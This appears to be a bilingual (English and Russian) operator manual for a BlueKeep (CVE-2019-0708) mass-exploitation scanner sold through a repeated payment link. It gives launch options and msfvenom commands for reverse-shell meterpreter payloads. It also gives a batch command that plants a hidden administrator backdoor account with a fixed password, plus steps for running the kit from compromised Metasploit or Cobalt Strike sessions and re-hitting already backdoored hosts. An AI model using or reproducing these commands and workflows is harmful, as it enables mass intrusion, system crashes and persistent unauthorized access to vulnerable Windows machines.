# CVE-2019-0708
Modified exploit

https://satoshidisk.com/pay/CEidrm


-----------------------------------------------------------------------------------------------------------------------------------

The scanner scans the addresses from the list and tries to connect to RDP port 3389
Dalle, the following algorithm of actions occurs:

1) Attempt to send a DisconnectProviderIndication command
Because it is different for different architectures 32/64 for axes from 2003 to 2008/W7 where bluekeep is not patched (CVE-2019-0708)
architecture can be found. If it doesn't work, the server goes to the bad list
2) A connection occurs via the RDP protocol and a system from the list is determined by some markers:
WindowsXP_2003,
windows2008,
Windows7_2008R2,
2016 Plus
3) If it was possible to determine the architecture and the Windows2008 or Windows7_2008R2 system, packets are sent to exploit the hole.
The main task is to guess the base address of the system address pool. There may be several options for different builds.
An unsuccessful attempt leads to a BSOD and waiting for the target to be overloaded. As the target gets in touch again, he is sent
the next version of the packages with another GroomBase.
W7-W2008R2 64-bit systems have four variants of grumbase. Three for W7 and fourth for 2008R2
For servers 2008 (not R2) and also for 2008R2SP0 (the very first release) one version of the grumbase.
For 32-bit systems, one grubase option for W7(2008SP2) and one for 2008SP1.

Thus, the selection can consist of 4ex, 2x and one attempt. Depends on the base version of the system.

The penetration probability is very dependent on the load of both the target and the host from which the scan is being performed.
The more they are loaded, the more likely it is that the exp will not work.
Therefore, you should not choose a large number of threads, for 4 cores and 4GB of memory and 1Gb channel no more than 50 (maximum number of threads: 1000).

With a successful penetration, an attempt is made to load a payload of the corresponding bitness.
Because The payload is loaded from memory, it must be a dll or pure shell code.
The dll must return control to the launching shellcode and not attempt to exit with the ExitProcess() win api.
The shellcode is run without parameters at zero offset.

An example of generating a reverse shell msf shellcode:
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=41444 -f raw > shellcode_x64.raw
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=41444 -f raw > shellcode_x86.raw

If the -cmd switch is used, then the cmd_payload_x86.exe and cmd_payload_x64.exe payloads must be used. They are
are specifically designed to run the -cmd command. The payloads test_payload_x64.exe and test_payload_x86.exe are intended for
for testing on their virtual machines. They launch a cmd window with system rights on the target.

bks.exe launch options [options]:

-p32 <payload_x86.dll>
-p64 <payload_x64.dll>
-cmd <cmd string>
-ipl <ipslist.txt>
-upd <update_mode>
-t <threads_count>

The -cmd "cmd string" option must be enclosed in quotes, the inner quotes must be padded with a backslash.
Maximum command line size: 1000 characters.

The -ipl option contains the name of the sheet file to scan . Inside there can be both single IPs and ranges, for example:
192.168.1.100
192.168.207.0-192.168.207.255
192.168.2.0:13389
192.168.0.0-192.168.255.255:3390

If no port is specified, the default RDP port will be used - 3389
Too large lists (millions of IPs) can cause the parser to hang. it sorts them and removes duplicates after loading.

The -upd parameter (payload update mode) is designed to work on already broken targets with an installed RDP backdoor.
A new payload will be sent to the target and launched there.
If the system on the target was rebooted (the backdoor no longer works), then the scanner will not pierce it again in this mode.

The -t parameter is intended to specify the number of threads from which the scan will be performed.
Maximum possible value: 1000.
ATTENTION! Too high thread values ​​(values ​​at which CPU peak loads are greater than 85%) will result in zero
scan results, or even freezing the scanner. For 4 cores, 4GB of memory and 1Gb channel, specify no more than 50 threads.

To start the scanner, it is convenient to create a batch file, for example:

bks -ipl iplist.txt -p32 cmd_payload_x86.exe -p64 cmd_payload_x64.exe -cmd "cmd.exe /c net user Support FUJyd64tf /add & net localgroup Administrators Support /add & net localgroup \"Remote Desktop Users\" Support /add & net accounts /maxpwage:unlimited & reg add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\" /t REG_DWORD /f /d 0 /v Support"
pause

Broken IPs are written to the goods.txt file, not broken into bads.txt
If you do not specify the payloads, the scanner will simply check the IP for the architecture and the base version of the axis. Log in checking mode is kept in scanned.txt

The scanner is protected from leaking (copying by an unauthorized person from your server) using the cfg.txt file. If it is present when the scanner is started,
then the scanner will work as usual. If it is not present, then the scanner will pretend that it is working, but the exp will not start.
Therefore, if you run the scanner for a long time on a server that can be accessed by outsiders, it is better to have cfg.txt after running
  
  --------------------------------------------------------------
  To work through Sox 5, see the example that is specified in the file run_s5_test.bat


-------------------------------------------------- ----------------------------------------------------
Bluekit manual
-------------------------------------------------- ----------------------------------------------------
; composition of the Bluekit tool

tree files->
bks.exe
iplist.txt
cfg.txt
run.bat
payload_x64.dll
payload_x32.dll

Note 1: payload_x64.dll, payload_x32.dll are our payloads from coba or from metasploit

Note 2: the cfg.txt file is the bks.exe protection, that is, at startup, after 10-20 seconds,
cfg.txt can be deleted. And if someone merges the bks.exe file, then without cfg.txt it is useless, so
how it will run idle.

Note 3: The iplist.txt file must contain the IP addresses of your targets, or a range of IP addresses.
Recording is done line by line.

Note 4: The run.bat file must contain the line:

bks -ipl iplist.txt -cmd "cmd.exe /c net user Support FUJyd64tf /add & net localgroup Administrators Support /add & net localgroup \"Remote Desktop Users\" Support /add & net accounts /maxpwage:unlimited & reg add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\" /t REG_DWORD /f /d 0 /v Support"
-------------------------------------------------- ----------------------------------------------------
;preparing to launch

We go into our session (in metasploit or in cob) and upload files there: bks.exe, iplist.txt, cfg.txt,
payload_x64.dll, payload_x32.dll, run.bat
-------------------------------------------------- ----------------------------------------------------
;start to start payloads

in metasploit, go to our session, load shell windows and execute from the folder where our files are:

bks.exe -ipl iplist.txt -p32 payload32.dll -p64 payload64.dll

Note: after such a launch, all cars that make it through will be launched payloads and fly
sessions in kobu or meta (whose payloads)
-------------------------------------------------- ----------------------------------------------------
;start to execute commands remotely

in order to create an admin on our vulnerable targets, we run our prepared run.bat

run.bat
-------------------------------------------------- ----------------------------------------------------
;reports

when doing bks, we will get the files goods.txt and bads.txt, respectively, where success is goods.txt,
where huevo - there is bads.txt
-------------------------------------------------- ----------------------------------------------------

in the folder where the scanner works at startup, there should be cfg.txt with a size of 5 bytes
  https://satoshidisk.com/pay/CEidrm
  ----------------------------------------------------------------------------------------
  
  Сканер сканирует адреса из листа и пытается соединиться в РДП порт 3389
Далле происходит следующий алгоритм действий:

1)Попытка отправить команду DisconnectProviderIndication
Т.к. она разная для разных архитектур 32/64 для осей с 2003 по 2008/W7 где не пропатчена блюкип (CVE-2019-0708)
можно выяснить архитектуру. Если не получается сервер уходит в бэд лист
2)Происходит соединение по протоколу RDP и по некоторым маркерам определяется система из списка:
	WindowsXP_2003,
	Windows2008,
	Windows7_2008R2,
	2016Plus
3)Если удалось определить архитектуру и система Windows2008 или Windows7_2008R2 происходит отсылка пакетов с эксплуатацией дыры.
Главная задача угадать базовый адрес системного пула адресов. Вариантов для разных билдов может быть несколько.
Неудачная попытка приводит к БСОДу и ожиданию перегрузки таргета. Как таргет снова выходит на связь ему отпраляется
следующий вариант пакетов с другим грумбэйзом (GroomBase).
У 64-битных систем W7-W2008R2 четыре варианта грумбэйза. Tри для W7 и четвертый для 2008R2
Для серверов 2008 (не R2)  а также для 2008R2SP0(самый первый выпуск) один вариант грумбэйза.
Для 32 битных систем один вариант грубэйза для W7(2008SP2) и один для 2008SP1.

Таким образом подбор может состоять из 4ех, 2ух и одной попытки. Зависит от базовой версии системы.

Вероятность пробива очень зависит от нагруженности как таргета так и хоста с которого ведется скан.
Чем сильнее они нагружены тем больше вероятность, что эксп не сработает.
Поэтому не стоит выбирать большое количество потоков, для 4 ядер и 4ГБ памяти и 1Гбит канале не более 50ти (максимальное число потоков: 1000).

При удачном пробитии идет попытка загрузить пэйлоад соответствующей битности.
Т.к. пэйлоад грузится из памяти это должна быть dll или чистый шелл код.
Dll должна возвращать управление запускающему шеллкоду и не пытаться завершить работу с помощью вин апи ExitProcess().
Шеллкод запускается без параметров по нулевому смещению.

Пример генерации шеллкода реверсшелла msf:
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=41444 -f raw > shellcode_x64.raw
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=41444 -f raw > shellcode_x86.raw

Если используется ключ -cmd , тогда необходимо использовать пэйлоады cmd_payload_x86.exe и cmd_payload_x64.exe. Они
специально предназначены для выполнения команды -cmd. Пэйлоады test_payload_x64.exe и test_payload_x86.exe предназначены
для тестирования на своих виртуалках. Они запускают окошко cmd c системными правами на таргете.

Опции запуска bks.exe [options]:

-p32 <payload_x86.dll>
-p64 <payload_x64.dll>
-cmd <cmd string>	
-ipl <ipslist.txt>
-upd <update_mode>
-t   <threads_count>

Параметр -cmd "cmd string" должен быть заключен в кавычки, внутренние кавычки должны быть дополнены обратным слэшем.
Максимальный размер командной строки: 1000 символов.

Параметр -ipl содержит имя файла листа для скана . Внутри могут быть как одиночные IP так и диапазоны, например : 
192.168.1.100
192.168.207.0-192.168.207.255
192.168.2.0:13389
192.168.0.0-192.168.255.255:3390

Если не указан порт, то будет использован RDP порт по умолчанию - 3389
Слишком большие листы (миллионы IP) могут вызвать зависания парсера т.к. он сортирует их и удаляет дубликаты после загрузки.

Параметр -upd (режим обновления пэйлоада) предназначен для работы по уже пробитым таргетам с установленным RDP бэкдором.
На таргет будет отправлен новый пэйлоад и запущен там.
Если система на таргете была перезагружена (бэкдор уже не работает) то заново его в этом режиме сканер пробивать не будет.

Параметр -t предназначен для указания количества потоков с которых будет вестись скан.
Максимально возможное значение: 1000. 
ВНИМАНИЕ! Слишком высокие значения потоков (значения при которых пиковые нагрузки на CPU больше 85%) приведут к нулевым
		  результатам скана или даже к зависанию сканера. Для 4 ядер, 4ГБ памяти и 1Гбит канале указывайте не более 50ти потоков.

Для старта сканера удобно создать батник, например такой:

bks -ipl iplist.txt -p32 cmd_payload_x86.exe -p64 cmd_payload_x64.exe -cmd "cmd.exe /c net user Support FUJyd64tf /add & net localgroup Administrators Support /add & net localgroup \"Remote Desktop Users\" Support /add & net accounts /maxpwage:unlimited & reg add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\" /t REG_DWORD /f /d 0 /v Support"
pause

Пробитые IP записываются в файл goods.txt, не пробитые в bads.txt
Если не указывать пэйлоады сканер будет просто чекать IP на архитектуру и базовую версию оси. Лог в чекинг режиме ведется в scanned.txt

Сканер защищен от слива (копирования посторонним лицом с вашего сервера) с помощью файла cfg.txt. Если он присутствует при запуске сканера,
то сканер будет работать как обычно. Если не присутствует, то сканер будет делать вид что работает но эксп запускаться не будет.
Поэтому если запускаете сканер на долго на сервере, к которому может быть доступ посторонних, лучше cfg.txt после запуска удалять.
  
  -------------------------------
  Сканер сканирует адреса из листа и пытается соединиться в РДП порт 3389
Далле происходит следующий алгоритм действий:

1)Попытка отправить команду DisconnectProviderIndication
Т.к. она разная для разных архитектур 32/64 для осей с 2003 по 2008/W7 где не пропатчена блюкип (CVE-2019-0708)
можно выяснить архитектуру. Если не получается сервер уходит в бэд лист
2)Происходит соединение по протоколу RDP и по некоторым маркерам определяется система из списка:
	WindowsXP_2003,
	Windows2008,
	Windows7_2008R2,
	2016Plus
3)Если удалось определить архитектуру и система Windows2008 или Windows7_2008R2 происходит отсылка пакетов с эксплуатацией дыры.
Главная задача угадать базовый адрес системного пула адресов. Вариантов для разных билдов может быть несколько.
Неудачная попытка приводит к БСОДу и ожиданию перегрузки таргета. Как таргет снова выходит на связь ему отпраляется
следующий вариант пакетов с другим грумбэйзом (GroomBase).
У 64-битных систем W7-W2008R2 четыре варианта грумбэйза. Tри для W7 и четвертый для 2008R2
Для серверов 2008 (не R2)  а также для 2008R2SP0(самый первый выпуск) один вариант грумбэйза.
Для 32 битных систем один вариант грубэйза для W7(2008SP2) и один для 2008SP1.

Таким образом подбор может состоять из 4ех, 2ух и одной попытки. Зависит от базовой версии системы.

Вероятность пробива очень зависит от нагруженности как таргета так и хоста с которого ведется скан.
Чем сильнее они нагружены тем больше вероятность, что эксп не сработает.
Поэтому не стоит выбирать большое количество потоков, для 4 ядер и 4ГБ памяти и 1Гбит канале не более 50ти (максимальное число потоков: 1000).

При удачном пробитии идет попытка загрузить пэйлоад соответствующей битности.
Т.к. пэйлоад грузится из памяти это должна быть dll или чистый шелл код.
Dll должна возвращать управление запускающему шеллкоду и не пытаться завершить работу с помощью вин апи ExitProcess().
Шеллкод запускается без параметров по нулевому смещению.

Пример генерации шеллкода реверсшелла msf:
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=41444 -f raw > shellcode_x64.raw
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=41444 -f raw > shellcode_x86.raw

Если используется ключ -cmd , тогда необходимо использовать пэйлоады cmd_payload_x86.exe и cmd_payload_x64.exe. Они
специально предназначены для выполнения команды -cmd. Пэйлоады test_payload_x64.exe и test_payload_x86.exe предназначены
для тестирования на своих виртуалках. Они запускают окошко cmd c системными правами на таргете.

Опции запуска bks.exe [options]:

-p32 <payload_x86.dll>
-p64 <payload_x64.dll>
-cmd <cmd string>	
-ipl <ipslist.txt>
-upd <update_mode>
-t   <threads_count>

Параметр -cmd "cmd string" должен быть заключен в кавычки, внутренние кавычки должны быть дополнены обратным слэшем.
Максимальный размер командной строки: 1000 символов.

Параметр -ipl содержит имя файла листа для скана . Внутри могут быть как одиночные IP так и диапазоны, например : 
192.168.1.100
192.168.207.0-192.168.207.255
192.168.2.0:13389
192.168.0.0-192.168.255.255:3390

Если не указан порт, то будет использован RDP порт по умолчанию - 3389
Слишком большие листы (миллионы IP) могут вызвать зависания парсера т.к. он сортирует их и удаляет дубликаты после загрузки.

Параметр -upd (режим обновления пэйлоада) предназначен для работы по уже пробитым таргетам с установленным RDP бэкдором.
На таргет будет отправлен новый пэйлоад и запущен там.
Если система на таргете была перезагружена (бэкдор уже не работает) то заново его в этом режиме сканер пробивать не будет.

Параметр -t предназначен для указания количества потоков с которых будет вестись скан.
Максимально возможное значение: 1000. 
ВНИМАНИЕ! Слишком высокие значения потоков (значения при которых пиковые нагрузки на CPU больше 85%) приведут к нулевым
		  результатам скана или даже к зависанию сканера. Для 4 ядер, 4ГБ памяти и 1Гбит канале указывайте не более 50ти потоков.

Для старта сканера удобно создать батник, например такой:

bks -ipl iplist.txt -p32 cmd_payload_x86.exe -p64 cmd_payload_x64.exe -cmd "cmd.exe /c net user Support FUJyd64tf /add & net localgroup Administrators Support /add & net localgroup \"Remote Desktop Users\" Support /add & net accounts /maxpwage:unlimited & reg add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\" /t REG_DWORD /f /d 0 /v Support"
pause

Пробитые IP записываются в файл goods.txt, не пробитые в bads.txt
Если не указывать пэйлоады сканер будет просто чекать IP на архитектуру и базовую версию оси. Лог в чекинг режиме ведется в scanned.txt

Сканер защищен от слива (копирования посторонним лицом с вашего сервера) с помощью файла cfg.txt. Если он присутствует при запуске сканера,
то сканер будет работать как обычно. Если не присутствует, то сканер будет делать вид что работает но эксп запускаться не будет.
Поэтому если запускаете сканер на долго на сервере, к которому может быть доступ посторонних, лучше cfg.txt после запуска удалять.
  
  ------------------------------
  
  https://satoshidisk.com/pay/CEidrm
